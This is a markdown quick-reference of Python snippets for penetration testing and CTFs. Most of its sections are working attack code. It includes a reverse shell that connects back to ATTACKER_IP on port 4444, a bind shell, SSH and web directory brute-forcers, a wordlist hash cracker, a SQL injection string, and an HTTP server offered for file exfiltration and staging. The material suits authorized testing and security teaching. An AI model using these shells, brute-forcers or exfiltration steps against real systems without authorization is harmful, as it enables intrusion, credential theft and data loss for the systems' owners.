---
name: Python
category: Utilities & Shell
description: Essential Python patterns for pentesting — sockets, HTTP, hashing, shells and automation.
tags: [python, scripting, sockets, requests, paramiko, pentest, automation]
---

# Python

Quick reference for the Python snippets that come up constantly during pentests, CTFs and security tooling. Covers raw sockets, HTTP, hashing, SSH, reverse shells and common one-liners.

> Requires Python 3.8+. Most snippets use only the standard library; external deps are noted where needed.

## TCP port scanner

```python
import socket

def scan(host, ports):
    for p in ports:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex((host, p)) == 0:
            print(f"[+] {host}:{p} open")
        s.close()

scan("10.0.0.5", range(1, 1025))
```

## Banner grabbing

```python
import socket

s = socket.socket()
s.settimeout(2)
s.connect(("10.0.0.5", 22))
print(s.recv(1024).decode())
s.close()
```

## TCP connect (bind/reverse) shell helpers

### Reverse shell (connect-back)

```python
import socket, subprocess, os

s = socket.socket()
s.connect(("ATTACKER_IP", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

### Bind shell (listener on target)

```python
import socket, subprocess, os

s = socket.socket()
s.bind(("0.0.0.0", 4444))
s.listen(1)
c, _ = s.accept()
os.dup2(c.fileno(), 0)
os.dup2(c.fileno(), 1)
os.dup2(c.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

## HTTP requests

```bash
pip install requests
```

```python
import requests

# GET
r = requests.get("https://target.com/api/users", verify=False)
print(r.status_code, r.json())

# POST (login form)
r = requests.post("https://target.com/login", data={"user": "admin", "pass": "admin"})
print(r.cookies)

# Custom headers / auth
s = requests.Session()
s.headers.update({"Authorization": "Bearer TOKEN"})
r = s.get("https://target.com/api/secret")
```

### Directory brute-force (basic)

```python
import requests

url = "https://target.com/{}"
with open("wordlist.txt") as f:
    for word in f:
        w = word.strip()
        r = requests.get(url.format(w), allow_redirects=False)
        if r.status_code != 404:
            print(f"[+] /{w}  →  {r.status_code}")
```

## Web scraping with BeautifulSoup

```bash
pip install beautifulsoup4
```

```python
from bs4 import BeautifulSoup
import requests

html = requests.get("https://target.com").text
soup = BeautifulSoup(html, "html.parser")

# Extract all links
for a in soup.find_all("a", href=True):
    print(a["href"])

# Extract form fields
for inp in soup.find_all("input"):
    print(inp.get("name"), inp.get("type"))
```

## Hashing & cracking

```python
import hashlib

# Generate hashes
hashlib.md5(b"password").hexdigest()
hashlib.sha256(b"password").hexdigest()

# Simple wordlist cracker
target = "5f4dcc3b5aa765d61d8327deb882cf99"  # md5("password")
with open("rockyou.txt", "rb") as f:
    for line in f:
        word = line.strip()
        if hashlib.md5(word).hexdigest() == target:
            print(f"[+] Found: {word.decode()}")
            break
```

## SSH with Paramiko

```bash
pip install paramiko
```

```python
import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("10.0.0.5", username="root", password="toor")

stdin, stdout, stderr = ssh.exec_command("id; whoami")
print(stdout.read().decode())
ssh.close()
```

### SSH brute-force (basic)

```python
import paramiko

def try_login(host, user, pw):
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(host, username=user, password=pw, timeout=3)
        c.close()
        return True
    except:
        return False

with open("passwords.txt") as f:
    for pw in f:
        pw = pw.strip()
        if try_login("10.0.0.5", "root", pw):
            print(f"[+] Valid: root:{pw}")
            break
```

## DNS lookups

```python
import socket

# Forward lookup
print(socket.gethostbyname("target.com"))

# Reverse lookup
print(socket.gethostbyaddr("93.184.216.34"))

# All records (using dnspython)
# pip install dnspython
import dns.resolver
for rtype in ["A", "AAAA", "MX", "NS", "TXT"]:
    try:
        ans = dns.resolver.resolve("target.com", rtype)
        for r in ans:
            print(f"{rtype}: {r}")
    except:
        pass
```

## Base64 / encoding tricks

```python
import base64

base64.b64encode(b"admin:password")         # Basic auth header value
base64.b64decode("YWRtaW46cGFzc3dvcmQ=")

# URL encoding
from urllib.parse import quote, unquote
quote("'; DROP TABLE users--")
unquote("%27%3B%20DROP%20TABLE%20users--")

# Hex
bytes.fromhex("48656c6c6f")                 # b'Hello'
b"Hello".hex()                               # '48656c6c6f'
```

## One-liner HTTP server (file exfil / staging)

```bash
python3 -m http.server 8080                  # serve cwd on port 8080
python3 -m http.server 8080 -d /tmp/loot     # serve specific dir
```

## Useful libraries cheat table

| Library | Use case |
|---------|----------|
| `socket` | Raw TCP/UDP, port scanning, banner grab |
| `requests` | HTTP client (GET, POST, sessions, cookies) |
| `paramiko` | SSH client and brute-force |
| `beautifulsoup4` | HTML parsing and scraping |
| [scapy](#/tool/scapy) | Packet crafting, sniffing, spoofing |
| `pwntools` | CTF exploit dev (ELF, ROP, shellcode) |
| `impacket` | SMB, Kerberos, MSRPC, AD attacks |
| `dnspython` | DNS queries and zone transfers |
| `cryptography` | AES, RSA, X.509, TLS cert parsing |
| `hashlib` | MD5, SHA-1/256/512 hashing |
